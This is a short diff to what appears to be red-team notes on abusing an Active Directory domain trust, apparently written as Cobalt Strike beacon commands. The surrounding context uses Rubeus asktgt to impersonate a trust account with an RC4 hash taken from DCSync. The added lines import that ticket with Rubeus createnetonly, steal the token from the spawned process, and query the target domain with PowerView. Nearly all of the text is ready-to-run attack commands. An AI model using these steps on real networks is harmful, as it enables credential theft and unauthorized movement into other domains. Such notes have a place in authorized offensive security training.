@@ -110,6 +110,9 @@ execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(
 this means the target domain will have a trust account named our domain$, this is the account we must impersonate
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<domain>$ /domain:<target domain> /rc4:<rc4 of password from dcsync> /nowrap
-
+import:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<current domain> /username:domain$ /password:FakePass /ticket:<base64>
+steal_token <PID>
+powershell Get-Domain -Domain <target domain>
 ```
 
